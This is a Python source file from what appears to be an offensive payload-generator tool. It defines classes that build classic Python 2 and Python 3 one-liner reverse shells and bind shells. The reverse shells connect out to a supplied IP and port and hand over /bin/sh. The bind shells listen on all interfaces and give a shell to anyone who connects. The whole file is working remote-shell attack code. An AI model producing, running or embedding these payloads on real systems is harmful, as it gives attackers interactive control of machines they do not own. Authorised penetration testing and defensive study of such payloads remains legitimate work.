"""
Python reverse and bind shell payload generators.

Author: Mostafa Tamime
"""

from generators.base import PayloadGenerator


class PythonGenerator(PayloadGenerator):
    """Classic Python2 socket reverse/bind shells."""

    def reverse(self, ip: str, port: int) -> str:
        return (
            f"python -c 'import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f's.connect(("{ip}",{port}));'
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            f'p=subprocess.call(["/bin/sh","-i"])\''
        )

    def bind(self, port: int) -> str:
        return (
            f"python -c 'import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);"
            f"s.bind((\"0.0.0.0\",{port}));s.listen(1);c,a=s.accept();"
            f"os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);"
            f'p=subprocess.call(["/bin/sh","-i"])\''
        )

    def file_extension(self) -> str:
        return ".py"


class Python3Generator(PayloadGenerator):
    """Classic Python3 socket reverse/bind shells."""

    def reverse(self, ip: str, port: int) -> str:
        return (
            f"python3 -c 'import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f's.connect(("{ip}",{port}));'
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            f'import pty; pty.spawn("/bin/sh")\''
        )

    def bind(self, port: int) -> str:
        return (
            f"python3 -c 'import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);"
            f"s.bind((\"0.0.0.0\",{port}));s.listen(1);c,a=s.accept();"
            f"os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);"
            f'import pty; pty.spawn("/bin/sh")\''
        )

    def file_extension(self) -> str:
        return ".py"
